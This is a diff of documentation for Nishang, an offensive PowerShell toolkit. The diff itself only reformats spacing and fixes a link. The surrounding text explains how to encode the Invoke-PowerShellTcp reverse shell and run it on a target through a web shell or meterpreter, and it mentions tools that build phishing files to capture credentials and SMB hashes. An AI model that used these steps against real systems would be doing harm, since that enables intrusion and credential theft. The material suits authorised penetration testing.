@@ -39,9 +39,13 @@ Method 2. Use the -encodedcommand (or -e) parameter of PowerShell
 All the scripts in Nishang export a function with same name in the current PowerShell session. Therefore, make sure the function call is made in the script itself while using encodedcommand parameter from a non-PowerShell shell. For above example, add a function call (without quotes) "Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]".
 
 Encode the scrript using Invoke-Encode from Nishang:
+
 PS C:\nishang> . \nishang\Utility\Invoke-Encode
+
 PS C:\nishang> Invoke-Encode -DataToEncode C:\nishang\Shells\Invoke-PowerShellTcp.ps1 -OutCommand
+
 Encoded data written to .\encoded.txt
+
 Encoded command written to .\encodedcommand.txt
 
 From above, use the encoded script from encodedcommand.txt and run it on a target where commands could be executed (a remote shell, meterpreter native shell, a web shell etc.). Use it like below:
@@ -122,7 +126,7 @@ Create IQY files for phishing credentials and SMB hashes.
 
 Create JS files capable of executing PowerShell commands and scripts.
 
-[Out-SCT](hhttps://github.com/samratashok/nishang/blob/master/Client/Out-SCT.ps1)
+[Out-SCT](https://github.com/samratashok/nishang/blob/master/Client/Out-SCT.ps1)
 
 Create SCT files capable of executing PowerShell commands and scripts.
 
